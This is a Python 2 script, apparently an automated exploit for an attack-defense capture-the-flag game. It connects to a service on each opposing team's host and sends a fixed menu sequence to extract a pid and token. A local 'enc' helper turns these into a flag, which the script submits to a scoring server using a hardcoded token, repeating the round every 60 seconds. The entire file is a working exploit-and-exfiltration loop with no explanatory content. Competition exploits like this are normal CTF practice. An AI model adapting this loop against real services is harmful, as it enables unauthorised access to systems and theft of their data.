#!/usr/bin/env python2
import traceback
import socket
import subprocess
import time
import re
from multiprocessing.dummy import Pool

regex_pid = re.compile('Portal (.*?) enabled')
regex_token = re.compile('Receiving \((.*)\)')

import httplib, sys

def sendkey(key):
    conn = httplib.HTTPConnection("10.217.0.100")
    conn.request("GET", "/team/submit_key?token=7d6251fc73922705186fa2eb5bba3e60&key=%s" % (key))
    r1 = conn.getresponse()
    print r1.read()

def _attak(team):
    print('attacking %s' % team)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
    sock.settimeout(5)
    sock.connect(('10.217.%d.201'%team, 21025))

    #sock = socket.create_connection(('10.217.%s.201' % team, 21025))

    def write(d):
        sock.send(d)

    def read():
        return sock.recv(65536)

    time.sleep(0.3)

    write('7\n')
    time.sleep(0.3)
    read()

    write('2\n')
    time.sleep(0.3)
    inp = read()
    try:
        pid = regex_pid.findall(inp)[0]
    except Exception:
        print inp


    write('3\n')
    time.sleep(0.3)

    write('1\n')
    time.sleep(0.3)
    read()

    write('1\n')
    time.sleep(0.3)
    read()

    write('7\n')
    time.sleep(0.3)
    read()

    write('4\n')
    time.sleep(0.3)
    inp = read()
    try:
        token = regex_token.findall(inp)[0]
    except Exception:
        print inp

    print(token)
    flag = subprocess.check_output(["./enc", pid, token]).strip('\n')
    """
    p_decrpyt = subprocess.Popen(['./enc', token, pid],
                                 stdin=subprocess.PIPE,
                                 stdout=subprocess.PIPE)
    flag = p_decrpyt.stdout.read()[32]
    """
    print("team: pid=%s token=%s flag=%s" % (pid, token, flag))
    print flag
    sendkey(flag)

def attack(team):
    try:
        _attak(team)
    except Exception as e:
        traceback.print_exc()


teams = [
    1,
#    2,
    3,
    4,
    5,
    6,
    7,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16,
]

while True:
    for i in teams:
        attack(i)
    time.sleep(60)

"""
pool = Pool(1)
pool.map_async(attack, teams)
pool.close()
pool.join()
"""

# print(regex_pid.findall('Portal 123 enabled'))
